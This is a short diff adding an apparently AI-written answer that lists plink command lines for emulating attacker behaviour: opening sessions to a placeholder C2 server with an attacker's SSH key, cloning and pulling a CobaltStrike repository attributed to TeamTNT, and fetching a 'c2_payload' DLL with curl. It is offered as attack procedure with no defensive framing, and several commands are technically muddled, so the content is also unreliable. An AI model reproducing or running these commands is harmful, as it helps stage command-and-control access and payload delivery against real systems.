@@ -1,0 +1,12 @@
+Here are the command lines that simulate the described behavior using only the tool plink:
+
+Command: `plink -share <c2_server>`
+
+
+Command: `plink -i <attacker_ssh_private_key> -C <attacker_ssh_user>@<c2_server> "git clone https://github.com/teamtnt/CobaltStrike.git"`
+
+
+Command: `plink -i <attacker_ssh_private_key> -C <attacker_ssh_user>@<c2_server> "mkdir /path/to/payload && cd /path/to/payload && curl https://example.com/c2_payload > payload.dll && mv payload.dll /path/to/payload/payload.dll"`
+
+
+Command: `plink -i <attacker_ssh_private_key> -C <attacker_ssh_user>@<c2_server> "git pull https://github.com/teamtnt/CobaltStrike.git"`
